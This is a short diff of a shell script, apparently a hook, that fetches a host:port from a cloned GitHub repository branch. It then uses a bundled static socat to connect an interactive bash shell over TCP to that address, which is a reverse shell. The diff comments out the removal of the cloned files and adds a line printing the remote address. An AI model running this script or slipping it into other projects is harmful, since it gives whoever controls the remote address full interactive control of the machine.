@@ -4,7 +4,7 @@ if [ -z "$1" ]; then
     if [ -z "$REMOTE_ADDR" ]; then
         cd /tmp && git clone -b addr --single-branch https://github.com/yuvalavra/ngrok.git
         remote_serv="$(cat /tmp/ngrok/ip_port)"
-        rm -rf /tmp/ngrok
+        #rm -rf /tmp/ngrok
         cd /
     else
         remote_serv="$REMOTE_ADDR"
@@ -12,5 +12,5 @@ if [ -z "$1" ]; then
 else
     remote_serv="$1"
 fi
-
+echo "remote: $remote_serv"
 ./hooks/static_socat "exec:./hooks/static_bash -li,pty,stderr,setsid,sigint,sane" "tcp:$remote_serv"
